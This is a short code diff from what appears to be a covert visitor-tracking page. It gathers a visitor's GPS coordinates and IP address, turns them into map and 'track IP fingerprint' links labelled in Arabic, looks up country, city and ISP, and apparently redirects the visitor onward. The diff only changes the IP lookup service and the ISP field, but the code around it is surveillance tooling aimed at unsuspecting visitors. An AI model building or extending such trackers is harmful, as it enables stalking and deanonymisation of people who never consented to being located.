@@ -43,7 +43,7 @@ redirectToNextURL();
    
     const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
     const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
-	const ipLocationLink = `https://browserleaks.com/ip/${ipAddress}`;
+	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
     const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
 
 // Location icon as text (Unicode character)
@@ -91,7 +91,7 @@ const userAgentData = navigator.userAgentData;
   const ipInfo = await getIPInfo(ipAddress);
   const country = ipInfo.country_name || 'N/A';
   const city = ipInfo.city || 'N/A';
-  const isp = ipInfo.isp || 'N/A';
+  const isp = ipInfo.org || 'N/A';
 
 
 
